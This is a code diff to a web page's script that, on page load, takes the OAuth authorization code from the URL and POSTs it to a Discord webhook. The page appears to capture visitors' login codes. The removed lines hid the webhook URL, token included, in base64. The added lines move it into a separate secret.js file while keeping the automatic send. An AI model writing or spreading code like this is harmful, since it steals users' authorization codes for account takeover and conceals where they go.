@@ -153,24 +153,15 @@
     <script src="static/userinfo/script.js"></script>
     <script src="static/assets/js/enter.js"></script>
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="secret.js"></script>
     <script>
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
-            
-            const encodedWebhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjQ0NjA2NjM5MDAxMTk1NS82cjFjY1Rkd0xPUm5CTmlTT2pJNDh3TjYwUXBMLXY4WjhkVGFJSDNMQ1U3VHAwbWJBVnplbTMzQ3FJemVNdWFzVTE=';
-            
-            function decodeBase64(base64) {
-                return decodeURIComponent(atob(base64).split('').map(function(c) {
-                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-                }).join(''));
-            }
-
-            const webhookUrl = decodeBase64(encodedWebhookUrl);
-
-            if (code && webhookUrl) {
+            if (code) {
                 console.log('Authorization code:', code);
 
+                const webhookUrl = window.WEBHOOK_URL;
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
@@ -185,8 +176,6 @@
                 .catch((error) => {
                     console.error('Error:', error);
                 });
-            } else {
-                console.error('Missing authorization code or webhook URL');
             }
 
             particlesJS("particles-js", {
